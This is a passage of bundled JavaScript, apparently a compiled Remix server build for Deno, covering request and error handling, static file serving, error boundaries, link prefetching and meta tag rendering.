    return handleError(errorInstance), json(serializeError(errorInstance, serverMode), {
      status: 500,
      headers: {
        "X-Remix-Error": "yes"
      }
    });
  }
}
function findParentBoundary(routes2, routeId, error) {
  let route = routes2[routeId] || routes2.root, isCatch = isRouteErrorResponse(error) && (!error.error || error.status === 404);
  return isCatch && route.module.CatchBoundary || !isCatch && route.module.ErrorBoundary || !route.parentId ? route.id : findParentBoundary(routes2, route.parentId, error);
}
function differentiateCatchVersusErrorBoundaries(build, context) {
  if (!context.errors)
    return;
  let errors = {};
  for (let routeId of Object.keys(context.errors)) {
    let error = context.errors[routeId], handlingRouteId = findParentBoundary(build.routes, routeId, error);
    errors[handlingRouteId] = error;
  }
  context.errors = errors;
}
async function handleDocumentRequestRR(serverMode, build, staticHandler, request, loadContext, handleError) {
  let context;
  try {
    context = await staticHandler.query(request, {
      requestContext: loadContext
    });
  } catch (error) {
    return handleError(error), new Response(null, {
      status: 500
    });
  }
  if (isResponse2(context))
    return context;
  context.errors && (Object.values(context.errors).forEach((err) => {
    (!isRouteErrorResponse(err) || err.error) && handleError(err);
  }), context.errors = sanitizeErrors(context.errors, serverMode)), build.future.v2_errorBoundary !== !0 && differentiateCatchVersusErrorBoundaries(build, context);
  let headers = getDocumentHeadersRR(build, context), entryContext = {
    manifest: build.assets,
    routeModules: createEntryRouteModules(build.routes),
    staticHandlerContext: context,
    serverHandoffString: createServerHandoffString({
      url: context.location.pathname,
      state: {
        loaderData: context.loaderData,
        actionData: context.actionData,
        errors: serializeErrors(context.errors, serverMode)
      },
      future: build.future
    }),
    future: build.future,
    serializeError: (err) => serializeError(err, serverMode)
  }, handleDocumentRequestFunction = build.entry.module.default;
  try {
    return await handleDocumentRequestFunction(request, context.statusCode, headers, entryContext, loadContext);
  } catch (error) {
    handleError(error), context = getStaticContextFromError(staticHandler.dataRoutes, context, error), context.errors && (context.errors = sanitizeErrors(context.errors, serverMode)), build.future.v2_errorBoundary !== !0 && differentiateCatchVersusErrorBoundaries(build, context), entryContext = {
      ...entryContext,
      staticHandlerContext: context,
      serverHandoffString: createServerHandoffString({
        url: context.location.pathname,
        state: {
          loaderData: context.loaderData,
          actionData: context.actionData,
          errors: serializeErrors(context.errors, serverMode)
        },
        future: build.future
      })
    };
    try {
      return await handleDocumentRequestFunction(request, context.statusCode, headers, entryContext, loadContext);
    } catch (error2) {
      return handleError(error2), returnLastResortErrorResponse(error2, serverMode);
    }
  }
}
async function handleResourceRequestRR(serverMode, staticHandler, routeId, request, loadContext, handleError) {
  try {
    let response = await staticHandler.queryRoute(request, {
      routeId,
      requestContext: loadContext
    });
    return invariant2(isResponse2(response), "Expected a Response to be returned from queryRoute"), response;
  } catch (error) {
    return isResponse2(error) ? (error.headers.set("X-Remix-Catch", "yes"), error) : isRouteErrorResponse(error) ? (error.error && handleError(error.error), errorResponseToJson(error, serverMode)) : (handleError(error), returnLastResortErrorResponse(error, serverMode));
  }
}
function errorResponseToJson(errorResponse, serverMode) {
  return json(serializeError(errorResponse.error || new Error("Unexpected Server Error"), serverMode), {
    status: errorResponse.status,
    statusText: errorResponse.statusText,
    headers: {
      "X-Remix-Error": "yes"
    }
  });
}
function returnLastResortErrorResponse(error, serverMode) {
  let message = "Unexpected Server Error";
  return serverMode !== ServerMode.Production && (message += `

${String(error)}`), new Response(message, {
    status: 500,
    headers: {
      "Content-Type": "text/plain"
    }
  });
}

// node_modules/@remix-run/deno/server.ts
var import_mime = __toESM(require_mime());
import * as path from "https://deno.land/std@0.128.0/path/mod.ts";
function defaultCacheControl(url, assetsPublicPath = "/build/") {
  return url.pathname.startsWith(assetsPublicPath) ? "public, max-age=31536000, immutable" : "public, max-age=600";
}
function createRequestHandler2({
  build,
  mode,
  getLoadContext
}) {
  let handleRequest2 = createRequestHandler(build, mode);
  return async (request) => {
    try {
      let loadContext = await (getLoadContext == null ? void 0 : getLoadContext(request));
      return handleRequest2(request, loadContext);
    } catch (error) {
      return console.error(error), new Response("Internal Error", { status: 500 });
    }
  };
}
var FileNotFoundError = class extends Error {
  constructor(filePath) {
    super(`No such file or directory: ${filePath}`);
  }
};
async function serveStaticFiles(request, {
  cacheControl,
  publicDir = "./public",
  assetsPublicPath = "/build/"
}) {
  let url = new URL(request.url), headers = new Headers(), contentType = import_mime.default.getType(url.pathname);
  contentType && headers.set("Content-Type", contentType), typeof cacheControl == "function" ? headers.set("Cache-Control", cacheControl(url)) : cacheControl ? headers.set("Cache-Control", cacheControl) : headers.set("Cache-Control", defaultCacheControl(url, assetsPublicPath));
  let filePath = path.join(publicDir, url.pathname);
  try {
    let file = await Deno.readFile(filePath);
    return new Response(file, { headers });
  } catch (error) {
    throw error.code === "EISDIR" || error.code === "ENOENT" ? new FileNotFoundError(filePath) : error;
  }
}
function createRequestHandlerWithStaticFiles({
  build,
  mode,
  getLoadContext,
  staticFiles = {
    publicDir: "./public",
    assetsPublicPath: "/build/"
  }
}) {
  let remixHandler2 = createRequestHandler2({ build, mode, getLoadContext });
  return async (request) => {
    try {
      return await serveStaticFiles(request, staticFiles);
    } catch (error) {
      if (!(error instanceof FileNotFoundError))
        throw error;
    }
    return remixHandler2(request);
  };
}

// server-entry-module:@remix-run/dev/server-build
var server_build_exports = {};
__export(server_build_exports, {
  assets: () => assets_manifest_default,
  assetsBuildDirectory: () => assetsBuildDirectory,
  entry: () => entry,
  future: () => future,
  publicPath: () => publicPath,
  routes: () => routes
});

// app/entry.server.tsx
var entry_server_exports = {};
__export(entry_server_exports, {
  default: () => handleRequest
});

// node_modules/@remix-run/react/dist/esm/_virtual/_rollupPluginBabelHelpers.js
function _extends4() {
  return _extends4 = Object.assign ? Object.assign.bind() : function(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];
      for (var key in source)
        Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
    }
    return target;
  }, _extends4.apply(this, arguments);
}

// node_modules/@remix-run/react/dist/esm/components.js
var React3 = __toESM(require_react());
init_dist2();

// node_modules/@remix-run/react/dist/esm/errorBoundaries.js
var import_react = __toESM(require_react());
init_dist2();
var RemixErrorBoundary = class extends import_react.default.Component {
  constructor(props) {
    super(props), this.state = {
      error: props.error || null,
      location: props.location
    };
  }
  static getDerivedStateFromError(error) {
    return {
      error
    };
  }
  static getDerivedStateFromProps(props, state) {
    return state.location !== props.location ? {
      error: props.error || null,
      location: props.location
    } : {
      error: props.error || state.error,
      location: state.location
    };
  }
  render() {
    return this.state.error ? /* @__PURE__ */ import_react.default.createElement(this.props.component, {
      error: this.state.error
    }) : this.props.children;
  }
};
function RemixRootDefaultErrorBoundary({
  error
}) {
  return import_react.default.useEffect(() => {
    console.error(error);
  }, [error]), /* @__PURE__ */ import_react.default.createElement("html", {
    lang: "en"
  }, /* @__PURE__ */ import_react.default.createElement("head", null, /* @__PURE__ */ import_react.default.createElement("meta", {
    charSet: "utf-8"
  }), /* @__PURE__ */ import_react.default.createElement("meta", {
    name: "viewport",
    content: "width=device-width, initial-scale=1, viewport-fit=cover"
  }), /* @__PURE__ */ import_react.default.createElement("title", null, "Application Error!")), /* @__PURE__ */ import_react.default.createElement("body", null, /* @__PURE__ */ import_react.default.createElement("main", {
    style: {
      fontFamily: "system-ui, sans-serif",
      padding: "2rem"
    }
  }, /* @__PURE__ */ import_react.default.createElement("h1", {
    style: {
      fontSize: "24px"
    }
  }, "Application Error"), error.stack ? /* @__PURE__ */ import_react.default.createElement("pre", {
    style: {
      padding: "2rem",
      background: "hsla(10, 50%, 50%, 0.1)",
      color: "red",
      overflow: "auto"
    }
  }, error.stack) : null), /* @__PURE__ */ import_react.default.createElement("script", {
    dangerouslySetInnerHTML: {
      __html: `
              console.log(
                "\u{1F4BF} Hey developer\u{1F44B}. You can provide a way better UX than this when your app throws errors. Check out https://remix.run/guides/errors for more information."
              );
            `
    }
  })));
}
function V2_RemixRootDefaultErrorBoundary() {
  let error = useRouteError();
  if (isRouteErrorResponse(error))
    return /* @__PURE__ */ import_react.default.createElement(RemixRootDefaultCatchBoundaryImpl, {
      caught: error
    });
  if (error instanceof Error)
    return /* @__PURE__ */ import_react.default.createElement(RemixRootDefaultErrorBoundary, {
      error
    });
  {
    let errorString = error == null ? "Unknown Error" : typeof error == "object" && "toString" in error ? error.toString() : JSON.stringify(error);
    return /* @__PURE__ */ import_react.default.createElement(RemixRootDefaultErrorBoundary, {
      error: new Error(errorString)
    });
  }
}
var RemixCatchContext = /* @__PURE__ */ import_react.default.createContext(void 0);
function useCatch() {
  return (0, import_react.useContext)(RemixCatchContext);
}
function RemixCatchBoundary({
  catch: catchVal,
  component: Component2,
  children
}) {
  return catchVal ? /* @__PURE__ */ import_react.default.createElement(RemixCatchContext.Provider, {
    value: catchVal
  }, /* @__PURE__ */ import_react.default.createElement(Component2, null)) : /* @__PURE__ */ import_react.default.createElement(import_react.default.Fragment, null, children);
}
function RemixRootDefaultCatchBoundary() {
  let caught = useCatch();
  return /* @__PURE__ */ import_react.default.createElement(RemixRootDefaultCatchBoundaryImpl, {
    caught
  });
}
function RemixRootDefaultCatchBoundaryImpl({
  caught
}) {
  return /* @__PURE__ */ import_react.default.createElement("html", {
    lang: "en"
  }, /* @__PURE__ */ import_react.default.createElement("head", null, /* @__PURE__ */ import_react.default.createElement("meta", {
    charSet: "utf-8"
  }), /* @__PURE__ */ import_react.default.createElement("meta", {
    name: "viewport",
    content: "width=device-width, initial-scale=1, viewport-fit=cover"
  }), /* @__PURE__ */ import_react.default.createElement("title", null, "Unhandled Thrown Response!")), /* @__PURE__ */ import_react.default.createElement("body", null, /* @__PURE__ */ import_react.default.createElement("h1", {
    style: {
      fontFamily: "system-ui, sans-serif",
      padding: "2rem"
    }
  }, caught.status, " ", caught.statusText), /* @__PURE__ */ import_react.default.createElement("script", {
    dangerouslySetInnerHTML: {
      __html: `
              console.log(
                "\u{1F4BF} Hey developer\u{1F44B}. You can provide a way better UX than this when your app throws 404s (and other responses). Check out https://remix.run/guides/not-found for more information."
              );
            `
    }
  })));
}

// node_modules/@remix-run/react/dist/esm/invariant.js
function invariant3(value, message) {
  if (value === !1 || value === null || typeof value > "u")
    throw new Error(message);
}

// node_modules/@remix-run/react/dist/esm/links.js
init_dist2();

// node_modules/@remix-run/react/dist/esm/routeModules.js
async function loadRouteModule(route, routeModulesCache) {
  if (route.id in routeModulesCache)
    return routeModulesCache[route.id];
  try {
    let routeModule = await import(
      /* webpackIgnore: true */
      route.module
    );
    return routeModulesCache[route.id] = routeModule, routeModule;
  } catch {
    return window.location.reload(), new Promise(() => {
    });
  }
}

// node_modules/@remix-run/react/dist/esm/links.js
function getLinksForMatches(matches, routeModules, manifest) {
  let descriptors = matches.map((match) => {
    var _module$links;
    let module = routeModules[match.route.id];
    return ((_module$links = module.links) === null || _module$links === void 0 ? void 0 : _module$links.call(module)) || [];
  }).flat(1), preloads = getCurrentPageModulePreloadHrefs(matches, manifest);
  return dedupe(descriptors, preloads);
}
function isPageLinkDescriptor(object) {
  return object != null && typeof object.page == "string";
}
function isHtmlLinkDescriptor(object) {
  return object == null ? !1 : object.href == null ? object.rel === "preload" && (typeof object.imageSrcSet == "string" || typeof object.imagesrcset == "string") && (typeof object.imageSizes == "string" || typeof object.imagesizes == "string") : typeof object.rel == "string" && typeof object.href == "string";
}
async function getStylesheetPrefetchLinks(matches, manifest, routeModules) {
  return (await Promise.all(matches.map(async (match) => {
    let mod = await loadRouteModule(manifest.routes[match.route.id], routeModules);
    return mod.links ? mod.links() : [];
  }))).flat(1).filter(isHtmlLinkDescriptor).filter((link) => link.rel === "stylesheet" || link.rel === "preload").map((link) => link.rel === "preload" ? {
    ...link,
    rel: "prefetch"
  } : {
    ...link,
    rel: "prefetch",
    as: "style"
  });
}
function getNewMatchesForLinks(page, nextMatches, currentMatches, manifest, location, mode) {
  let path2 = parsePathPatch(page), isNew = (match, index) => currentMatches[index] ? match.route.id !== currentMatches[index].route.id : !0, matchPathChanged = (match, index) => {
    var _currentMatches$index;
    return (
      // param change, /users/123 -> /users/456
      currentMatches[index].pathname !== match.pathname || // splat param changed, which is not present in match.path
      // e.g. /files/images/avatar.jpg -> files/finances.xls
      ((_currentMatches$index = currentMatches[index].route.path) === null || _currentMatches$index === void 0 ? void 0 : _currentMatches$index.endsWith("*")) && currentMatches[index].params["*"] !== match.params["*"]
    );
  };
  return mode === "data" && location.search !== path2.search ? (
    // this is really similar to stuff in transition.ts, maybe somebody smarter
    // than me (or in less of a hurry) can share some of it. You're the best.
    nextMatches.filter((match, index) => {
      if (!manifest.routes[match.route.id].hasLoader)
        return !1;
      if (isNew(match, index) || matchPathChanged(match, index))
        return !0;
      if (match.route.shouldRevalidate) {
        var _currentMatches$;
        let routeChoice = match.route.shouldRevalidate({
          currentUrl: new URL(location.pathname + location.search + location.hash, window.origin),
          currentParams: ((_currentMatches$ = currentMatches[0]) === null || _currentMatches$ === void 0 ? void 0 : _currentMatches$.params) || {},
          nextUrl: new URL(page, window.origin),
          nextParams: match.params,
          defaultShouldRevalidate: !0
        });
        if (typeof routeChoice == "boolean")
          return routeChoice;
      }
      return !0;
    })
  ) : nextMatches.filter((match, index) => {
    let manifestRoute = manifest.routes[match.route.id];
    return (mode === "assets" || manifestRoute.hasLoader) && (isNew(match, index) || matchPathChanged(match, index));
  });
}
function getDataLinkHrefs(page, matches, manifest) {
  let path2 = parsePathPatch(page);
  return dedupeHrefs(matches.filter((match) => manifest.routes[match.route.id].hasLoader).map((match) => {
    let {
      pathname,
      search
    } = path2, searchParams = new URLSearchParams(search);
    return searchParams.set("_data", match.route.id), `${pathname}?${searchParams}`;
  }));
}
function getModuleLinkHrefs(matches, manifestPatch) {
  return dedupeHrefs(matches.map((match) => {
    let route = manifestPatch.routes[match.route.id], hrefs = [route.module];
    return route.imports && (hrefs = hrefs.concat(route.imports)), hrefs;
  }).flat(1));
}
function getCurrentPageModulePreloadHrefs(matches, manifest) {
  return dedupeHrefs(matches.map((match) => {
    let route = manifest.routes[match.route.id], hrefs = [route.module];
    return route.imports && (hrefs = hrefs.concat(route.imports)), hrefs;
  }).flat(1));
}
function dedupeHrefs(hrefs) {
  return [...new Set(hrefs)];
}
function dedupe(descriptors, preloads) {
  let set = /* @__PURE__ */ new Set(), preloadsSet = new Set(preloads);
  return descriptors.reduce((deduped, descriptor) => {
    if (!isPageLinkDescriptor(descriptor) && descriptor.as === "script" && descriptor.href && preloadsSet.has(descriptor.href))
      return deduped;
    let str = JSON.stringify(descriptor);
    return set.has(str) || (set.add(str), deduped.push(descriptor)), deduped;
  }, []);
}
function parsePathPatch(href) {
  let path2 = parsePath(href);
  return path2.search === void 0 && (path2.search = ""), path2;
}

// node_modules/@remix-run/react/dist/esm/markup.js
var ESCAPE_LOOKUP2 = {
  "&": "\\u0026",
  ">": "\\u003e",
  "<": "\\u003c",
  "\u2028": "\\u2028",
  "\u2029": "\\u2029"
}, ESCAPE_REGEX2 = /[&><\u2028\u2029]/g;
function escapeHtml2(html) {
  return html.replace(ESCAPE_REGEX2, (match) => ESCAPE_LOOKUP2[match]);
}
function createHtml(html) {
  return {
    __html: html
  };
}

// node_modules/@remix-run/react/dist/esm/transition.js
var IDLE_FETCHER2 = {
  state: "idle",
  type: "init",
  data: void 0,
  formMethod: void 0,
  formAction: void 0,
  formEncType: void 0,
  formData: void 0,
  json: void 0,
  text: void 0,
  submission: void 0
};

// node_modules/@remix-run/react/dist/esm/components.js
function useDataRouterContext3() {
  let context = React3.useContext(DataRouterContext);
  return invariant3(context, "You must render this element inside a <DataRouterContext.Provider> element"), context;
}
function useDataRouterStateContext() {
  let context = React3.useContext(DataRouterStateContext);
  return invariant3(context, "You must render this element inside a <DataRouterStateContext.Provider> element"), context;
}
var RemixContext = /* @__PURE__ */ React3.createContext(void 0);
RemixContext.displayName = "Remix";
function useRemixContext() {
  let context = React3.useContext(RemixContext);
  return invariant3(context, "You must render this element inside a <Remix> element"), context;
}
function RemixRoute({
  id
}) {
  let {
    routeModules,
    future: future2
  } = useRemixContext();
  invariant3(routeModules, `Cannot initialize 'routeModules'. This normally occurs when you have server code in your client modules.
Check this link for more details:
https://remix.run/pages/gotchas#server-code-in-client-bundles`);
  let {
    default: Component2,
    ErrorBoundary,
    CatchBoundary
  } = routeModules[id];
  return !Component2 && (ErrorBoundary || !future2.v2_errorBoundary && CatchBoundary) && (Component2 = Outlet), invariant3(Component2, `Route "${id}" has no component! Please go add a \`default\` export in the route module file.
If you were trying to navigate or submit to a resource route, use \`<a>\` instead of \`<Link>\` or \`<Form reloadDocument>\`.`), /* @__PURE__ */ React3.createElement(Component2, null);
}
function RemixRouteError({
  id
}) {
  let {
    future: future2,
    routeModules
  } = useRemixContext();
  invariant3(routeModules, `Cannot initialize 'routeModules'. This normally occurs when you have server code in your client modules.
Check this link for more details:
https://remix.run/pages/gotchas#server-code-in-client-bundles`);
  let error = useRouteError(), {
    CatchBoundary,
    ErrorBoundary
  } = routeModules[id];
  if (future2.v2_errorBoundary) {
    if (id === "root" && (ErrorBoundary || (ErrorBoundary = V2_RemixRootDefaultErrorBoundary)), ErrorBoundary)
      return /* @__PURE__ */ React3.createElement(ErrorBoundary, null);
    throw error;
  }
  if (id === "root" && (CatchBoundary || (CatchBoundary = RemixRootDefaultCatchBoundary), ErrorBoundary || (ErrorBoundary = RemixRootDefaultErrorBoundary)), isRouteErrorResponse(error)) {
    let tError = error;
    if (tError != null && tError.error && tError.status !== 404 && ErrorBoundary)
      return /* @__PURE__ */ React3.createElement(ErrorBoundary, {
        error: tError.error
      });
    if (CatchBoundary)
      return /* @__PURE__ */ React3.createElement(RemixCatchBoundary, {
        catch: error,
        component: CatchBoundary
      });
  }
  if (error instanceof Error && ErrorBoundary)
    return /* @__PURE__ */ React3.createElement(ErrorBoundary, {
      error
    });
  throw error;
}
function usePrefetchBehavior(prefetch, theirElementProps) {
  let [maybePrefetch, setMaybePrefetch] = React3.useState(!1), [shouldPrefetch, setShouldPrefetch] = React3.useState(!1), {
    onFocus,
    onBlur,
    onMouseEnter,
    onMouseLeave,
    onTouchStart
  } = theirElementProps, ref = React3.useRef(null);
  React3.useEffect(() => {
    if (prefetch === "render" && setShouldPrefetch(!0), prefetch === "viewport") {
      let callback = (entries) => {
        entries.forEach((entry2) => {
          setShouldPrefetch(entry2.isIntersecting);
        });
      }, observer = new IntersectionObserver(callback, {
        threshold: 0.5
      });
      return ref.current && observer.observe(ref.current), () => {
        observer.disconnect();
      };
    }
  }, [prefetch]);
  let setIntent = () => {
    prefetch === "intent" && setMaybePrefetch(!0);
  }, cancelIntent = () => {
    prefetch === "intent" && (setMaybePrefetch(!1), setShouldPrefetch(!1));
  };
  return React3.useEffect(() => {
    if (maybePrefetch) {
      let id = setTimeout(() => {
        setShouldPrefetch(!0);
      }, 100);
      return () => {
        clearTimeout(id);
      };
    }
  }, [maybePrefetch]), [shouldPrefetch, ref, {
    onFocus: composeEventHandlers(onFocus, setIntent),
    onBlur: composeEventHandlers(onBlur, cancelIntent),
    onMouseEnter: composeEventHandlers(onMouseEnter, setIntent),
    onMouseLeave: composeEventHandlers(onMouseLeave, cancelIntent),
    onTouchStart: composeEventHandlers(onTouchStart, setIntent)
  }];
}
var ABSOLUTE_URL_REGEX3 = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i, NavLink2 = /* @__PURE__ */ React3.forwardRef(({
  to,
  prefetch = "none",
  ...props
}, forwardedRef) => {
  let isAbsolute = typeof to == "string" && ABSOLUTE_URL_REGEX3.test(to), href = useHref(to), [shouldPrefetch, ref, prefetchHandlers] = usePrefetchBehavior(prefetch, props);
  return /* @__PURE__ */ React3.createElement(React3.Fragment, null, /* @__PURE__ */ React3.createElement(NavLink, _extends4({}, props, prefetchHandlers, {
    ref: mergeRefs(forwardedRef, ref),
    to
  })), shouldPrefetch && !isAbsolute ? /* @__PURE__ */ React3.createElement(PrefetchPageLinks, {
    page: href
  }) : null);
});
NavLink2.displayName = "NavLink";
var Link2 = /* @__PURE__ */ React3.forwardRef(({
  to,
  prefetch = "none",
  ...props
}, forwardedRef) => {
  let isAbsolute = typeof to == "string" && ABSOLUTE_URL_REGEX3.test(to), href = useHref(to), [shouldPrefetch, ref, prefetchHandlers] = usePrefetchBehavior(prefetch, props);
  return /* @__PURE__ */ React3.createElement(React3.Fragment, null, /* @__PURE__ */ React3.createElement(Link, _extends4({}, props, prefetchHandlers, {
    ref: mergeRefs(forwardedRef, ref),
    to
  })), shouldPrefetch && !isAbsolute ? /* @__PURE__ */ React3.createElement(PrefetchPageLinks, {
    page: href
  }) : null);
});
Link2.displayName = "Link";
function composeEventHandlers(theirHandler, ourHandler) {
  return (event2) => {
    theirHandler && theirHandler(event2), event2.defaultPrevented || ourHandler(event2);
  };
}
var linksWarning = "\u26A0\uFE0F REMIX FUTURE CHANGE: The behavior of links `imagesizes` and `imagesrcset` will be changing in v2. Only the React camel case versions will be valid. Please change to `imageSizes` and `imageSrcSet`. For instructions on making this change see https://remix.run/docs/en/v1.15.0/pages/v2#links-imagesizes-and-imagesrcset";
var fetcherTypeWarning = "\u26A0\uFE0F REMIX FUTURE CHANGE: `fetcher.type` will be removed in v2. Please use `fetcher.state`, `fetcher.formData`, and `fetcher.data` to achieve the same UX. For instructions on making this change see https://remix.run/docs/en/v1.15.0/pages/v2#usefetcher", fetcherSubmissionWarning = "\u26A0\uFE0F REMIX FUTURE CHANGE : `fetcher.submission` will be removed in v2. The submission fields are now part of the fetcher object itself (`fetcher.formData`). For instructions on making this change see https://remix.run/docs/en/v1.15.0/pages/v2#usefetcher";
function Links() {
  let {
    manifest,
    routeModules
  } = useRemixContext(), {
    errors,
    matches: routerMatches
  } = useDataRouterStateContext(), matches = errors ? routerMatches.slice(0, routerMatches.findIndex((m) => errors[m.route.id]) + 1) : routerMatches, links2 = React3.useMemo(() => getLinksForMatches(matches, routeModules, manifest), [matches, routeModules, manifest]);
  return React3.useEffect(() => {
    links2.some((link) => "imagesizes" in link || "imagesrcset" in link) && void 0;
  }, [links2]), /* @__PURE__ */ React3.createElement(React3.Fragment, null, links2.map((link) => {
    if (isPageLinkDescriptor(link))
      return /* @__PURE__ */ React3.createElement(PrefetchPageLinks, _extends4({
        key: link.page
      }, link));
    let imageSrcSet = null;
    return "useId" in React3 ? (link.imagesrcset && (link.imageSrcSet = imageSrcSet = link.imagesrcset, delete link.imagesrcset), link.imagesizes && (link.imageSizes = link.imagesizes, delete link.imagesizes)) : (link.imageSrcSet && (link.imagesrcset = imageSrcSet = link.imageSrcSet, delete link.imageSrcSet), link.imageSizes && (link.imagesizes = link.imageSizes, delete link.imageSizes)), /* @__PURE__ */ React3.createElement("link", _extends4({
      key: link.rel + (link.href || "") + (imageSrcSet || "")
    }, link));
  }));
}
function PrefetchPageLinks({
  page,
  ...dataLinkProps
}) {
  let {
    router
  } = useDataRouterContext3(), matches = React3.useMemo(() => matchRoutes(router.routes, page), [router.routes, page]);
  return matches ? /* @__PURE__ */ React3.createElement(PrefetchPageLinksImpl, _extends4({
    page,
    matches
  }, dataLinkProps)) : (console.warn(`Tried to prefetch ${page} but no routes matched.`), null);
}
function usePrefetchedStylesheets(matches) {
  let {
    manifest,
    routeModules
  } = useRemixContext(), [styleLinks, setStyleLinks] = React3.useState([]);
  return React3.useEffect(() => {
    let interrupted = !1;
    return getStylesheetPrefetchLinks(matches, manifest, routeModules).then((links2) => {
      interrupted || setStyleLinks(links2);
    }), () => {
      interrupted = !0;
    };
  }, [matches, manifest, routeModules]), styleLinks;
}
function PrefetchPageLinksImpl({
  page,
  matches: nextMatches,
  ...linkProps
}) {
  let location = useLocation(), {
    manifest
  } = useRemixContext(), {
    matches
  } = useDataRouterStateContext(), newMatchesForData = React3.useMemo(() => getNewMatchesForLinks(page, nextMatches, matches, manifest, location, "data"), [page, nextMatches, matches, manifest, location]), newMatchesForAssets = React3.useMemo(() => getNewMatchesForLinks(page, nextMatches, matches, manifest, location, "assets"), [page, nextMatches, matches, manifest, location]), dataHrefs = React3.useMemo(() => getDataLinkHrefs(page, newMatchesForData, manifest), [newMatchesForData, page, manifest]), moduleHrefs = React3.useMemo(() => getModuleLinkHrefs(newMatchesForAssets, manifest), [newMatchesForAssets, manifest]), styleLinks = usePrefetchedStylesheets(newMatchesForAssets);
  return /* @__PURE__ */ React3.createElement(React3.Fragment, null, dataHrefs.map((href) => /* @__PURE__ */ React3.createElement("link", _extends4({
    key: href,
    rel: "prefetch",
    as: "fetch",
    href
  }, linkProps))), moduleHrefs.map((href) => /* @__PURE__ */ React3.createElement("link", _extends4({
    key: href,
    rel: "modulepreload",
    href
  }, linkProps))), styleLinks.map((link) => (
    // these don't spread `linkProps` because they are full link descriptors
    // already with their own props
    /* @__PURE__ */ React3.createElement("link", _extends4({
      key: link.href
    }, link))
  )));
}
function V1Meta() {
  let {
    routeModules
  } = useRemixContext(), {
    errors,
    matches: routerMatches,
    loaderData
  } = useDataRouterStateContext(), location = useLocation(), matches = errors ? routerMatches.slice(0, routerMatches.findIndex((m) => errors[m.route.id]) + 1) : routerMatches, meta2 = {}, parentsData = {};
  for (let match of matches) {
    let routeId = match.route.id, data = loaderData[routeId], params = match.params, routeModule = routeModules[routeId];
    if (routeModule.meta) {
      let routeMeta = typeof routeModule.meta == "function" ? routeModule.meta({
        data,
        parentsData,
        params,
        location
      }) : routeModule.meta;
      if (routeMeta && Array.isArray(routeMeta))
        throw new Error(
          "The route at " + match.route.path + " returns an array. This is only supported with the `v2_meta` future flag in the Remix config. Either set the flag to `true` or update the route's meta function to return an object.\n\nTo reference the v1 meta function API, see https://remix.run/route/meta"
          // TODO: Add link to the docs once they are written
          // + "\n\nTo reference future flags and the v2 meta API, see https://remix.run/file-conventions/remix-config#future-v2-meta."
        );
      Object.assign(meta2, routeMeta);
    }
    parentsData[routeId] = data;
  }
  return /* @__PURE__ */ React3.createElement(React3.Fragment, null, Object.entries(meta2).map(([name, value]) => {
    if (!value)
      return null;
    if (["charset", "charSet"].includes(name))
      return /* @__PURE__ */ React3.createElement("meta", {
        key: "charSet",
        charSet: value
      });
    if (name === "title")
      return /* @__PURE__ */ React3.createElement("title", {
        key: "title"
      }, String(value));
    let isOpenGraphTag = /^(og|music|video|article|book|profile|fb):.+$/.test(name);
    return [value].flat().map((content) => isOpenGraphTag ? /* @__PURE__ */ React3.createElement("meta", {
      property: name,
      content,
      key: name + content
    }) : typeof content == "string" ? /* @__PURE__ */ React3.createElement("meta", {
      name,
      content,
      key: name + content
    }) : /* @__PURE__ */ React3.createElement("meta", _extends4({
      key: name + JSON.stringify(content)
    }, content)));
  }));
}
function V2Meta() {
  let {
    routeModules
  } = useRemixContext(), {
    errors,
    matches: routerMatches,
    loaderData
  } = useDataRouterStateContext(), location = useLocation(), _matches = errors ? routerMatches.slice(0, routerMatches.findIndex((m) => errors[m.route.id]) + 1) : routerMatches, meta2 = [], leafMeta = null, matches = [];
  for (let i = 0; i < _matches.length; i++) {
    let _match = _matches[i], routeId = _match.route.id, data = loaderData[routeId], params = _match.params, routeModule = routeModules[routeId], routeMeta = [], match = {
      id: routeId,
      data,
      meta: [],
      params: _match.params,
      pathname: _match.pathname,
      handle: _match.route.handle,
      // TODO: Remove in v2. Only leaving it for now because we used it in
      // examples and there's no reason to crash someone's build for one line.
      // They'll get a TS error from the type updates anyway.
      // @ts-expect-error
      get route() {
        return console.warn("The meta function in " + _match.route.path + " accesses the `route` property on `matches`. This is deprecated and will be removed in Remix version 2. See"), _match.route;
      }
    };
    if (matches[i] = match, routeModule != null && routeModule.meta ? routeMeta = typeof routeModule.meta == "function" ? routeModule.meta({
      data,
      params,
      location,
      matches
    }) : Array.isArray(routeModule.meta) ? [...routeModule.meta] : routeModule.meta : leafMeta && (routeMeta = [...leafMeta]), routeMeta = routeMeta || [], !Array.isArray(routeMeta))
      throw new Error("The `v2_meta` API is enabled in the Remix config, but the route at " + _match.route.path + ` returns an invalid value. In v2, all route meta functions must return an array of meta objects.

To reference the v1 meta function API, see https://remix.run/route/meta`);
    match.meta = routeMeta, matches[i] = match, meta2 = [...routeMeta], leafMeta = meta2;
  }
  return /* @__PURE__ */ React3.createElement(React3.Fragment, null, meta2.flat().map((metaProps) => {
    if (!metaProps)
      return null;
    if ("tagName" in metaProps) {
      let tagName = metaProps.tagName;
      return delete metaProps.tagName, isValidMetaTag(tagName) ? /* @__PURE__ */ React3.createElement(tagName, _extends4({
        key: JSON.stringify(metaProps)
      }, metaProps)) : (console.warn(`A meta object uses an invalid tagName: ${tagName}. Expected either 'link' or 'meta'`), null);
    }
    if ("title" in metaProps)
      return /* @__PURE__ */ React3.createElement("title", {
        key: "title"
      }, String(metaProps.title));
    if ("charset" in metaProps && (metaProps.charSet ?? (metaProps.charSet = metaProps.charset), delete metaProps.charset), "charSet" in metaProps && metaProps.charSet != null)
      return typeof metaProps.charSet == "string" ? /* @__PURE__ */ React3.createElement("meta", {
        key: "charSet",
        charSet: metaProps.charSet
      }) : null;
    if ("script:ld+json" in metaProps) {
      let json4 = null;
      try {
        json4 = JSON.stringify(metaProps["script:ld+json"]);
      } catch {
      }
      return json4 != null && /* @__PURE__ */ React3.createElement("script", {
        key: "script:ld+json",
        type: "application/ld+json",
        dangerouslySetInnerHTML: {
          __html: JSON.stringify(metaProps["script:ld+json"])
        }
      });
    }
    return /* @__PURE__ */ React3.createElement("meta", _extends4({
      key: JSON.stringify(metaProps)
    }, metaProps));
  }));
}
function isValidMetaTag(tagName) {
  return typeof tagName == "string" && /^(meta|link)$/.test(tagName);
}
function Meta() {
  let {
    future: future2
  } = useRemixContext();
  return future2 != null && future2.v2_meta ? /* @__PURE__ */ React3.createElement(V2Meta, null) : /* @__PURE__ */ React3.createElement(V1Meta, null);
}
